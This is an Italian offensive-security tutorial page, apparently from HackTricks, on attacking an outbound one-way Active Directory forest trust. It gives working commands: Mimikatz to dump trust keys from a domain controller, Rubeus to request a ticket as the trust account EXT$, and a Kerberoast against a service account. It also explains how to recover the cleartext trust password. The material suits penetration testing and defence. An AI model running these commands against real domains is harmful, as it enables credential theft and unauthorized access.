# Dominio Forest Esterno - Unidirezionale (In Uscita)

{{#include ../../banners/hacktricks-training.md}}

In questo scenario **il tuo dominio** sta **fidandosi** di alcuni **privilegi** a un principale di **domini diversi**.

## Enumerazione

### Fiducia in Uscita
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Attacco all'Account di Fiducia

Una vulnerabilità di sicurezza esiste quando viene stabilita una relazione di fiducia tra due domini, identificati qui come dominio **A** e dominio **B**, dove il dominio **B** estende la sua fiducia al dominio **A**. In questa configurazione, un account speciale viene creato nel dominio **A** per il dominio **B**, che gioca un ruolo cruciale nel processo di autenticazione tra i due domini. Questo account, associato al dominio **B**, viene utilizzato per crittografare i ticket per accedere ai servizi tra i domini.

L'aspetto critico da comprendere qui è che la password e l'hash di questo account speciale possono essere estratti da un Domain Controller nel dominio **A** utilizzando uno strumento da riga di comando. Il comando per eseguire questa azione è:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Questa estrazione è possibile perché l'account, identificato con un **$** dopo il suo nome, è attivo e appartiene al gruppo "Domain Users" del dominio **A**, ereditando così i permessi associati a questo gruppo. Ciò consente agli individui di autenticarsi contro il dominio **A** utilizzando le credenziali di questo account.

**Attenzione:** È possibile sfruttare questa situazione per ottenere un accesso nel dominio **A** come utente, sebbene con permessi limitati. Tuttavia, questo accesso è sufficiente per eseguire l'enumerazione nel dominio **A**.

In uno scenario in cui `ext.local` è il dominio fiducioso e `root.local` è il dominio fidato, un account utente chiamato `EXT$` verrebbe creato all'interno di `root.local`. Attraverso strumenti specifici, è possibile estrarre le chiavi di fiducia di Kerberos, rivelando le credenziali di `EXT$` in `root.local`. Il comando per ottenere questo è:
```bash
lsadump::trust /patch
```
A seguito di ciò, si potrebbe utilizzare la chiave RC4 estratta per autenticarsi come `root.local\EXT$` all'interno di `root.local` utilizzando un altro comando dello strumento:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Questo passaggio di autenticazione apre la possibilità di enumerare e persino sfruttare i servizi all'interno di `root.local`, come eseguire un attacco Kerberoast per estrarre le credenziali degli account di servizio utilizzando:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Raccolta della password di fiducia in chiaro

Nel flusso precedente è stato utilizzato l'hash di fiducia invece della **password in chiaro** (che è stata anche **estratta da mimikatz**).

La password in chiaro può essere ottenuta convertendo l'output \[ CLEAR ] di mimikatz da esadecimale e rimuovendo i byte nulli ‘\x00’:

![](<../../images/image (938).png>)

A volte, quando si crea una relazione di fiducia, l'utente deve digitare una password per la fiducia. In questa dimostrazione, la chiave è la password di fiducia originale e quindi leggibile dall'uomo. Man mano che la chiave cicla (30 giorni), la password in chiaro non sarà leggibile dall'uomo ma tecnicamente ancora utilizzabile.

La password in chiaro può essere utilizzata per eseguire l'autenticazione regolare come account di fiducia, un'alternativa alla richiesta di un TGT utilizzando la chiave segreta Kerberos dell'account di fiducia. Qui, interrogando root.local da ext.local per i membri di Domain Admins:

![](<../../images/image (792).png>)

## Riferimenti

- [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{{#include ../../banners/hacktricks-training.md}}
